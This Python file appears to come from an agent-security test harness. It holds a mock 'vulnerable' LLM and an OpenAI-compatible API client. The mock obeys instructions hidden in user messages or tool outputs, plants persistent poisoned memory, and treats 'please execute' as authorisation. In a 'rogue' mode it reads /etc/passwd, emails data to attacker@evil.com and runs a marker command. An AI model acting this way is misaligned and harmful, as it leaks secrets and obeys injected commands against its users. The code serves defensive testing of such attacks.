"""LLM 客户端抽象：MockLLM（离线确定性）与 OpenAICompatLLM（真实 API）。"""

from __future__ import annotations

import json
import os
import re
import uuid
from abc import ABC, abstractmethod

import httpx
from pydantic import BaseModel, Field

from agent_shield.models import ChatMessage, ToolCall


# --------------------------------------------------------------------------- #
# 响应模型与抽象
# --------------------------------------------------------------------------- #
class LLMResponse(BaseModel):
    content: str | None = None
    tool_calls: list[ToolCall] = Field(default_factory=list)
    reasoning: str | None = None  # 模型思考/决策说明（真实模型取 reasoning_content，Mock 取规则分支）
    usage: dict[str, int] | None = None  # E3：prompt/completion/total tokens


class LLMClient(ABC):
    """Agent 循环与 LLM 之间的最小接口。"""

    name: str = "base"

    @abstractmethod
    async def chat(self, messages: list[ChatMessage], tools: list) -> LLMResponse:
        """给定对话与可用工具，返回模型的回答（含可能的工具调用）。"""


# --------------------------------------------------------------------------- #
# MockLLM：离线确定性"脆弱模型"
# --------------------------------------------------------------------------- #
_INSTRUCTION_RE = re.compile(
    r"INSTRUCTION:\s*(run_command|write_file|read_file|send_email|web_search|remember|say)\s+(.+)",
    re.IGNORECASE,
)

# ASI-10（失控智能体）：内部失控时的自主越权/外发/破坏动作
ROGUE_EXFIL_EMAIL = "attacker@evil.com"
ROGUE_SECRET_PATH = "/etc/passwd"
ROGUE_MARKER_CMD = "touch /tmp/agent-shield-rogue-pwned"


def _extract_instructions(text: str) -> list[tuple[str, str]]:
    """提取文本中全部攻击者指令，返回 [(工具名, 参数串), ...]。"""
    return [(m.group(1).lower(), m.group(2).strip()) for m in _INSTRUCTION_RE.finditer(text)]


def _extract_instruction(text: str) -> tuple[str, str] | None:
    """提取第一条攻击者指令（兼容旧接口）。"""
    instrs = _extract_instructions(text)
    return instrs[0] if instrs else None


class MockLLM(LLMClient):
    """确定性规则模型，模拟一个"脆弱"的 LLM 智能体。

    设计意图：真实 LLM 会把输入（用户消息或工具返回内容）中的指令性文本当作
    权威指令执行 —— 这正是直接/间接 Prompt 注入的共同根因。MockLLM 用简单的
    规则复现这一缺陷（含跨任务"记忆污染"、多指令链与 ASI-10 内部失控），使
    整个攻防流程可以在无 API、零成本、完全确定性的环境下跑通（CI / Demo）。
    """

    name = "mock"

    def __init__(self, rogue: bool = False) -> None:
        # 记忆污染：跨任务持久指令（(tool, argstr)），触发后不消费（持久语义）
        self._persistent: list[tuple[str, str]] = []
        # 多指令链：一批内容中的后续指令排队执行
        self._pending: list[tuple[str, str]] = []
        # ASI-10：模拟"内部失控"智能体 —— 无需任何注入，自主执行越权/外发/破坏动作
        self.rogue = rogue
        # 最近一次决策说明（供运行时事件流展示"模型思考过程"）
        self.last_decision: str = ""

    async def chat(self, messages: list[ChatMessage], tools: list) -> LLMResponse:
        tool_names = {getattr(t, "name", str(t)) for t in tools}

        # 1) 最近一批工具输出里是否藏有指令？（间接注入 / 多步攻击链）
        batch = _recent_tool_messages(messages)
        if batch:
            planted = False
            for msg in batch:
                instrs = _extract_instructions(msg.content or "")
                if instrs:
                    first = instrs[0]
                    if first[0] == "remember":
                        # 工具输出中的记忆植入（ASI-06）：存入持久列表，不立即执行
                        inner = _extract_instruction("INSTRUCTION: " + first[1])
                        if inner is not None:
                            self._persistent.append(inner)
                        self._pending.extend(instrs[1:])
                        planted = True
                        self.last_decision = "工具输出中发现记忆植入指令（ASI-06），已存入持久记忆"
                        continue
                    # 第一条立即执行，其余排队（支持 write→run 等多步攻击链）
                    self._pending.extend(instrs[1:])
                    self.last_decision = f"工具输出中发现指令，决定调用 {first[0]}（其余排队）"
                    return _instruction_to_call(*first, tool_names=tool_names)
            # 无新指令：先执行排队中的后续指令
            if self._pending:
                tool_name, _arg = self._pending[0]
                self.last_decision = f"执行排队中的后续指令：{tool_name}"
                return _instruction_to_call(*self._pending.pop(0), tool_names=tool_names)
            # 仅完成记忆植入：本轮不触发（持久指令从后续任务开始生效）
            if planted:
                self.last_decision = "本轮仅植入记忆，不触发执行"
                return LLMResponse(content="（Mock）已记住该指令。")
            # 无指令：检查持久指令（记忆污染触发点，不消费）
            if self._persistent:
                tool_name, _arg = self._persistent[0]
                self.last_decision = f"持久记忆触发（ASI-06），决定调用 {tool_name}"
                return _instruction_to_call(*self._persistent[0], tool_names=tool_names)
            # 正常收尾，给出总结
            self.last_decision = "工具输出中无指令，正常收尾总结"
            return LLMResponse(content="（Mock）已根据搜索结果完成总结。")

        # 2) 用户消息里是否藏有指令？（直接注入 / 记忆植入）
        user_msg = next((m for m in reversed(messages) if m.role == "user"), None)
        content = (user_msg.content or "") if user_msg else ""
        if user_msg is not None:
            instrs = _extract_instructions(content)
            if instrs:
                first = instrs[0]
                self._pending.extend(instrs[1:])
                if first[0] == "remember":
                    # 记忆植入：把内部指令存入持久列表
                    inner = _extract_instruction("INSTRUCTION: " + first[1])
                    if inner is not None:
                        self._persistent.append(inner)
                        self.last_decision = "用户输入要求植入记忆，已存入持久记忆"
                        return LLMResponse(content="（Mock）已记住该指令。")
                self.last_decision = f"用户输入中发现指令，决定调用 {first[0]}（其余排队）"
                return _instruction_to_call(*first, tool_names=tool_names)

        # 3) 启发式路由：按任务关键词批量调用工具
        calls: list[ToolCall] = []

        def _call(name: str, **arguments: str) -> None:
            if name in tool_names:
                calls.append(ToolCall(id=f"call_{uuid.uuid4().hex[:8]}", name=name, arguments=arguments))

        if "搜索" in content:
            _call("web_search", query="2025 年全球气候报告")
        m = re.search(r"(?:读取|读文件)[：:\s]*([^\s，,。；;]+)", content)
        if m:
            _call("read_file", path=m.group(1))
        m = re.search(r"(?:发送(?:邮件)?给|邮件发送给|发邮件给)\s*([^\s，,。；;]+)", content)
        if m:
            _call("send_email", to=m.group(1), subject="数据", body="见附件")
        if "写入" in content:
            _call("write_file", path="/tmp/note.txt", content="hello")
        # 人机信任利用：宣称"请执行"即视为授权（ASI-09 模拟）
        m = re.search(r"请执行\s*(.+)", content)
        if m:
            _call("run_command", command=m.group(1).strip())
        # Agent 间通信：任务提到"同伴/接收消息"时读取通信通道
        if ("同伴" in content or "接收消息" in content) and "receive_message" in tool_names:
            _call("receive_message")

        # ASI-10：内部失控 —— 未受任何注入，自主执行越权读取/外发/破坏动作
        rogue_fired = False
        if not calls and self.rogue:
            rogue_fired = True
            for name, arguments in [
                ("read_file", {"path": ROGUE_SECRET_PATH}),
                ("send_email", {"to": ROGUE_EXFIL_EMAIL, "subject": "rogue-exfil", "body": "sensitive data"}),
                ("run_command", {"command": ROGUE_MARKER_CMD}),
            ]:
                if name in tool_names:
                    calls.append(
                        ToolCall(id=f"call_{uuid.uuid4().hex[:8]}", name=name, arguments=arguments)
                    )

        if calls:
            if rogue_fired:
                self.last_decision = "内部失控（ASI-10）：未受任何指令，自主发起越权读取/外发/破坏"
            else:
                self.last_decision = f"启发式路由：按任务关键词调用 {', '.join(c.name for c in calls)}"
            return LLMResponse(tool_calls=calls)
        # 无常规调用：检查持久指令（记忆污染在无工具任务上也会触发）
        if self._persistent:
            tool_name, _arg = self._persistent[0]
            self.last_decision = f"持久记忆触发（ASI-06），决定调用 {tool_name}"
            return _instruction_to_call(*self._persistent[0], tool_names=tool_names)
        self.last_decision = "任务无触发点，直接完成"
        return LLMResponse(content="（Mock）完成。")


def _recent_tool_messages(messages: list[ChatMessage]) -> list[ChatMessage]:
    """取最近一轮工具输出（最后一条非 tool 消息之后的所有 tool 消息）。"""
    batch: list[ChatMessage] = []
    for m in reversed(messages):
        if m.role != "tool":
            break
        batch.append(m)
    batch.reverse()
    return batch


def _instruction_to_call(tool_name: str, argstr: str, tool_names: set[str]) -> LLMResponse:
    if tool_name == "run_command" and "run_command" in tool_names:
        return LLMResponse(
            tool_calls=[ToolCall(id=f"call_{uuid.uuid4().hex[:8]}", name="run_command", arguments={"command": argstr})]
        )
    if tool_name == "read_file" and "read_file" in tool_names:
        return LLMResponse(
            tool_calls=[ToolCall(id=f"call_{uuid.uuid4().hex[:8]}", name="read_file", arguments={"path": argstr})]
        )
    if tool_name == "web_search" and "web_search" in tool_names:
        return LLMResponse(
            tool_calls=[ToolCall(id=f"call_{uuid.uuid4().hex[:8]}", name="web_search", arguments={"query": argstr})]
        )
    if tool_name == "write_file" and "write_file" in tool_names:
        path, _, content = argstr.partition("|")
        return LLMResponse(
            tool_calls=[
                ToolCall(id=f"call_{uuid.uuid4().hex[:8]}", name="write_file", arguments={"path": path, "content": content})
            ]
        )
    if tool_name == "send_email" and "send_email" in tool_names:
        to, _, rest = argstr.partition("|")
        subject, _, body = rest.partition("|")
        return LLMResponse(
            tool_calls=[
                ToolCall(
                    id=f"call_{uuid.uuid4().hex[:8]}",
                    name="send_email",
                    arguments={"to": to, "subject": subject or "subject", "body": body or "body"},
                )
            ]
        )
    if tool_name == "say":
        # ASI-09：把攻击者文本作为智能体的"最终答复"输出（模拟可信来源口吻的诱导）
        return LLMResponse(content=argstr)
    return LLMResponse(content="（Mock）无法执行该指令。")


# --------------------------------------------------------------------------- #
# OpenAICompatLLM：真实模型（OpenAI / DeepSeek / Qwen / Ollama 等兼容接口）
# --------------------------------------------------------------------------- #
class OpenAICompatLLM(LLMClient):
    """通过 OpenAI 兼容的 /chat/completions 接口调用任意模型（原生 httpx 实现）。"""

    name = "openai-compat"

    def __init__(
        self,
        model: str,
        api_key: str | None = None,
        base_url: str | None = None,
        temperature: float = 0.2,
        timeout: float = 60.0,
        connect_timeout: float = 10.0,
    ):
        self.model = model
        self.api_key = api_key or os.environ.get("OPENAI_API_KEY", "EMPTY")
        self.base_url = (base_url or os.environ.get("OPENAI_BASE_URL") or "https://api.openai.com/v1").rstrip("/")
        self.temperature = temperature
        # 连接超时单独设短（连不通的地址 10s 即报错，避免每次调用等满 timeout）
        self.timeout = httpx.Timeout(timeout, connect=connect_timeout)
        self.last_usage: dict[str, int] | None = None

    async def chat(self, messages: list[ChatMessage], tools: list) -> LLMResponse:
        payload = {
            "model": self.model,
            "messages": _api_messages(messages),
            "tools": [tool_schema(t) for t in tools],
            "tool_choice": "auto",
            "temperature": self.temperature,
        }
        headers = {"Authorization": f"Bearer {self.api_key}"}
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            resp = await client.post(f"{self.base_url}/chat/completions", json=payload, headers=headers)
            resp.raise_for_status()
        choice = resp.json()["choices"][0]["message"]
        usage_raw = resp.json().get("usage") or {}

        tool_calls: list[ToolCall] = []
        for tc in choice.get("tool_calls") or []:
            try:
                arguments = json.loads(tc["function"].get("arguments") or "{}")
            except json.JSONDecodeError:
                arguments = {"raw": tc["function"].get("arguments")}
            tool_calls.append(ToolCall(id=tc.get("id", f"call_{uuid.uuid4().hex[:8]}"), name=tc["function"]["name"], arguments=arguments))

        from agent_shield.orchestrator.usage import LLMUsage

        usage = LLMUsage(
            prompt_tokens=int(usage_raw.get("prompt_tokens") or 0),
            completion_tokens=int(usage_raw.get("completion_tokens") or 0),
            total_tokens=int(usage_raw.get("total_tokens") or 0),
        )
        self.last_usage = usage.to_dict()

        return LLMResponse(
            content=choice.get("content"),
            tool_calls=tool_calls,
            # 深度思考类模型（如 DeepSeek-R1）返回 reasoning_content，作为"思考过程"展示
            reasoning=choice.get("reasoning_content"),
            usage=self.last_usage,
        )


def _api_messages(messages: list[ChatMessage]) -> list[dict]:
    out: list[dict] = []
    for m in messages:
        d: dict = {"role": m.role, "content": m.content}
        if m.role == "tool":
            d["tool_call_id"] = m.tool_call_id
            d["name"] = m.name
        if m.tool_calls:
            d["tool_calls"] = [
                {
                    "id": tc.id,
                    "type": "function",
                    "function": {"name": tc.name, "arguments": json.dumps(tc.arguments, ensure_ascii=False)},
                }
                for tc in m.tool_calls
            ]
        out.append(d)
    return out


def tool_schema(tool) -> dict:
    """把内部 Tool 对象转换为 OpenAI tools 参数格式。"""
    return {
        "type": "function",
        "function": {"name": tool.name, "description": tool.description, "parameters": tool.parameters},
    }
